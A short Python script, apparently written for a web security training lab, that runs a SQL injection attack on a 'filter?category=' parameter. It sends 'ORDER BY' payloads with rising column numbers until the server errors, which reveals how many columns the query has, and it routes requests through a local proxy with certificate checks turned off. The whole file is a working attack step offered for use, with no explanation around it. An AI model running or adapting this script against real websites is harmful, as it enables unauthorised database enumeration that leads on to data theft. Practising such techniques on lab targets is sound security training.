import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    uri = "filter?category="
    order = int(sys.argv[2]) + 1
    for i in range(1,order):
        payload = f"'+order+by+{i}--+-"
        request = requests.get(url + uri + payload, verify=False, proxies=proxies)
        response = request.text
        if "Internal Server Error" in response:
            return (i - 1)
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] syntax-error: {sys.argv[0]} <url> <range>")
        sys.exit(1)
    numCol = exploit(url)
    print("[?] status: calculating...")
    if numCol:
        print(f"[+] detected: [{numCol}] columns")
    else:
        print("[-] status: failure")
